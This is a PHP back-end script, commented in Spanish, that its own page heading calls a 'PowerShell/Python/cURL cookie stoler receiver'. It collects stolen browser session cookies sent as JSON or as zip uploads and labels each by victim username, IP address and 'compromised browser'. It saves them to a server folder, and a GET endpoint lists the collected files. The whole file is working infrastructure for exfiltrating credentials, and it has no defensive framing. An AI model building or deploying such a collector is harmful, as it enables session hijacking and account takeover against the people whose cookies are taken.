<?php
    date_default_timezone_set('America/Santiago');

    $jsonRetorno = array(
        "status" => "DEFAULT",
        "description" => "SOMETHING IS REALLY WRONG."
    );
    function GetCookiesAsString() {
        global $jsonRetorno;
        $file = "cookies/cookies.json"; # EL ARCHIVO DONDE SE ALMACENAN LAS COOKIES
        $jsonData = file_get_contents('php://input'); # PARA RECIBIR EL JSON DESDE EL CLIENTE
        $data = json_decode($jsonData, true); # CONVIERTE EL JSON DEL CLIENTE EN UN ARRAY PHP
        if ($data !== null) {
            if (isset($data['site']) && isset($data['cookies']) && $data['site'] != "" && $data['cookies'] != "") {
                $cookiesJSON = json_decode(file_get_contents($file), true);
                $json = array(
                    "site" => $data['site'],
                    "creation" => date("F j, Y, g:i a"),
                    "author" => $_SERVER['REMOTE_ADDR'],
                    "cookies" => $data['cookies'],
                );
                $cookiesJSON[] = $json; # AGREGA LAS COOKIES DEL CLIENTE EN EL ALMACEN DEL SERVIDOR
                file_put_contents($file, json_encode($cookiesJSON)); # GUARDA
                # LA TAREA FUE EXITOSA, NOTIFICA AL CLIENTE
                $jsonRetorno["status"] = "OK";
                $jsonRetorno["description"] = array(
                    "site" => $data['site'],
                    "author" => $_SERVER['REMOTE_ADDR']
                );
            } else { # SI LOS CAMPOS NO ESTAN BIEN DEFINIDOS
                http_response_code(400);
                $jsonRetorno["status"] = "FAIL";
                $jsonRetorno["description"] = "No data, no party.";
            }
        }
    } function GetCookiesAsFile() {
        global $jsonRetorno;
        # CONCATENA EL NOMBRE DE USUARIO, LA DIRECCION IP Y EL NAVEGADOR COMPROMETIDO
        $fileName = ((array_key_exists("user", $_POST)) ? $_POST["user"]."-".str_replace("::1", "localhost", $_SERVER["REMOTE_ADDR"]) : str_replace("::1", "localhost", $_SERVER["REMOTE_ADDR"]));
        $fileName .= ((array_key_exists("browser", $_POST)) ? "-".$_POST["browser"] : "");
        if (is_uploaded_file($_FILES['file']['tmp_name'])) {
            # filePath = exp =~ "01022023-102030_Crizacio.192.168.8.50-Firefox"
            $filePath = "cookies/".date('dmy-gis')."_".$fileName.".zip";
            # SUBIMOS EL ARCHIVO AL SERVIDOR
            if (move_uploaded_file(
                $_FILES['file']['tmp_name'],
                $filePath
            )) { # SI LA SUBIDA ES EXITOSA
                $jsonRetorno["status"] = "OK";
                $jsonRetorno["description"] = array(
                    "user" => $_POST["user"],
                    "ip" => $_SERVER['REMOTE_ADDR'],
                    "file" => $filePath
                );
            } else { # SI ALGO FALLO DURANTE LA SUBIDA
                http_response_code(400);
                $jsonRetorno["status"] = "FAIL";
                $jsonRetorno["description"] = "Error white trying to upload the file!";
            }
        } else {
            http_response_code(400);
            $jsonRetorno["status"] = "FAIL";
            $jsonRetorno["description"] = "No file to upload!";
        }
    }
    function API_MODE_REQUEST() {
        global $jsonRetorno;
        header('Content-Type: application/json; charset=UTF-8');
        if (isset($_GET['get']) && $_GET['get'] != "") {
            if ($_GET['get'] == "files") {
                $jsonRetorno['status'] = "OK";
                # LISTAMOS EL CONTENIDO DE LA CARPETA /COOKIES/ Y LA DEVOLVEMOS
                $jsonRetorno['description'] = array_values(array_diff(scandir("cookies/"), array('.', '..')));
            }
            die(json_encode($jsonRetorno));
        // } elseif (isset($_GET['']) && $_GET[''] != "") {
        }
    }
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
            API_MODE_REQUEST(); # PARA VER SI LA PETICION REQUIERE UN TIPO API
            header('Content-Type: text/html; charset=UTF-8');
            ?>
            <h1>PowerShell/Python/cURL cookie stoler receiver</h1>
            <p>Back-End script para datos entrantes.</p>
            <?php
    } elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
        header('Content-Type: application/json; charset=UTF-8');
        # discriminar si es cookie as string o as file
        # direccionar la request
        if (array_key_exists("file", $_FILES)) { # SI HAY ARCHIVO EN EL POST
            # si es As File
            GetCookiesAsFile();
        } else { # SI NO HAY ARCHIVO, PERO SI HAY UN POST
            # si es As String
            GetCookiesAsString();
        }
        die(json_encode($jsonRetorno));
    }
?>